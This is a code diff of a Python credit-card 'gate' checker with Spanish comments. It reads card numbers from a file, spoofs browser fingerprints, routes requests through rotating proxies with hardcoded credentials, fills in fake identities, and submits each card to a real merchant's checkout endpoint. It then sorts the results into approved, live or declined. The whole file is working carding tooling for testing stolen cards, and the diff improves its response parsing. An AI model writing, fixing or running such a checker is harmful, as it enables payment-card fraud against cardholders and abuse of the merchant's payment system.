@@ -1,5 +1,5 @@
 import random
-import time # Añadido para el sleep
+import time
 from faker import Faker
 from random import choice
 #from captcha_bypass import *
@@ -13,7 +13,6 @@ import os
 # CONFIGURACIÓN DEL PROXY
 # -------------------------
 # Puedes mantener las credenciales en variables de entorno (recomendado) o usar las literales abajo.
-# Ejemplo (recomendado): export PROXY_LOGIN=... ; export PROXY_PASSWORD=... antes de ejecutar el script.
 proxy_login = os.environ.get('PROXY_LOGIN', '6c87cc76d68ca38831bf')
 proxy_password = os.environ.get('PROXY_PASSWORD', '918d291b0f3847af')
 proxy_host = os.environ.get('PROXY_HOST', 'gw.dataimpulse.com')
@@ -46,9 +45,6 @@ def capture(data, start, end):
 def ccn_gate(card):
     max_retries = 10
     retry_count = 0
-    
-    # Inicia colorama solo si se va a usar en el __main__ o aquí
-    # Aunque ya no usamos Fore.GREEN/RED para el retorno, es buena práctica si imprimes.
     init(autoreset=True) 
 
     while retry_count < max_retries:
@@ -57,7 +53,6 @@ def ccn_gate(card):
             cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
             cliente.proxies = {"https": "http://ckwvyrbn-rotate:9bdwth8dgwwq@p.webshare.io:80"}
             
-            # Asegura que card siempre se pueda dividir
             if card.count('|') < 3:
                 return f"{card}|ERROR|Formato de tarjeta incompleto (se requiere CC|MM|YYYY|CVV)."
 
@@ -66,7 +61,6 @@ def ccn_gate(card):
             agente_user = UserAgent().random
 
             #============[Address Found]============#
-            # El uso de usuario() repetido es ineficiente pero mantenemos la lógica base
             u_info = usuario()
             name  = u_info['name'].split(' ')[0]
             last  = u_info['name'].split(' ')[1]
@@ -76,8 +70,6 @@ def ccn_gate(card):
             phone = u_info['phone']
 
             #============[Requests 1-6: Configuración de Carrito y Checkout]============#
-            # ... (código de requests 1 a 6 omitido por ser boilerplate y asumido correcto) ...
-            
             headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
             result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
             form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')
@@ -108,54 +100,61 @@ def ccn_gate(card):
             data    = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}&billing%5Baddress%5D={street}&billing%5Bcity%5D=EUGENE&billing%5Bstate%5D=Oregon&billing%5BpostalCode%5D=10080&billing%5Bcountry%5D=US&shipping%5Bname%5D={name}+{last}&shipping%5Baddress%5D={street}&shipping%5Bcity%5D=eugene&shipping%5Bstate%5D=Oregon&shipping%5BpostalCode%5D=97402&shipping%5Bcountry%5D=US"
             result  = cliente.post(url="https://glorybee.com/paya/checkout/request", data=data, headers=headers)
             
+            # --- Extracción de la Respuesta ---
+            message_text = "UNKNOWN_MESSAGE"
+            message_code = "UNKNOWN_CODE"
+            
             try:
-                # Intenta parsear el JSON y extraer los campos.
                 response_json = result.json()
                 payment_response = response_json.get('paymentresponse', '')
                 
-                # Intentamos capturar del string paymentresponse
+                # Captura de mensaje y código
                 message_text = capture(payment_response, '"message":"', '"')
                 message_code = capture(payment_response, '"code":"', '"')
-            except:
-                # Si el resultado.json() falla o las capturas fallan, usamos el texto completo.
-                message_text = "ERROR: No se pudo obtener la respuesta del JSON."
-                message_code = "UNKNOWN_CODE"
-                
+            except Exception as e:
+                # Esto sucede si result.json() falla o la estructura JSON no es la esperada
+                message_text = f"JSON Error: {str(e)}"
+                message_code = "JSON_PARSE_FAIL"
+            
+            # Si la captura falla, debemos usar un valor predeterminado
+            if not message_text: message_text = "GATEWAY_MESSAGE_NOT_FOUND"
+            if not message_code: message_code = "GATEWAY_CODE_NOT_FOUND"
 
-            #============[Lógica de Respuestas]============#
+
+            #============[Lógica de Respuestas y Retorno Limpio]============#
 
             # 1. Aprobada por AVS
             if "AVS FAILURE" in result.text:
-                return f"{card}|APPROVED|AVS FAILURE|" # Sin código, ya que AVS FAILURE es el mensaje
+                # Retorna: CC|MM|YYYY|CVV|APPROVED|AVS FAILURE||
+                return f"{card}|APPROVED|AVS FAILURE|" 
 
             # 2. Live probable o CVV Match (La clave para la aprobación)
             elif "CVV2 MISMATCH" in message_text:
-                # El formato deseado es: CC|MM|YYYY|CVV|APPROVED|CVV2 MISMATCH|0000N7|
+                # Retorna: CC|MM|YYYY|CVV|APPROVED|CVV2 MISMATCH|0000N7|
                 return f"{card}|APPROVED|CVV2 MISMATCH|{message_code}|"
 
             # 3. Live probable (ej. "There was a problem with the request.")
             elif "There was a problem with the request." in message_text:
+                # Retorna: CC|MM|YYYY|CVV|PROBABLE LIVE|There was a problem with the request.|CODE|
                 return f"{card}|PROBABLE LIVE|{message_text}|{message_code}|"
                 
             # 4. Rechazada/Declinada (El resto de respuestas)
-            # Aseguramos que el estado es DECLINED y el mensaje es el del gateway.
+            # Retorna: CC|MM|YYYY|CVV|DECLINED|SUSPECTED FRAUD|000059|
             return f"{card}|DECLINED|{message_text}|{message_code}|"
             
         except Exception as e:
             # Manejo de errores de red o excepciones generales (proxy, timeout, etc.)
             print(f"Error en intento {retry_count + 1}: {e}")
             retry_count += 1
-            # Pequeña pausa antes de reintentar
             time.sleep(1) 
-            continue # Vuelve al inicio del bucle while
+            continue
             
     # Bloque ELSE (Se ejecuta si se agotaron los reintentos)
-    # Devuelve un error que el bot parsea como fallo de conexión/mantenimiento.
+    # Retorna: CC|MM|YYYY|CVV|ERROR|Max Retries...|
     return f"{card}|ERROR|Max Retries: Fallo de conexión o límite de intentos ({max_retries} reintentos)." 
 
 
 if __name__ == "__main__":
-    # La lógica para leer y escribir en el archivo debe ir fuera de la función del gateway
     file = open('card.txt', 'r')
     lines = file.readlines()
     for position, x in enumerate(lines):
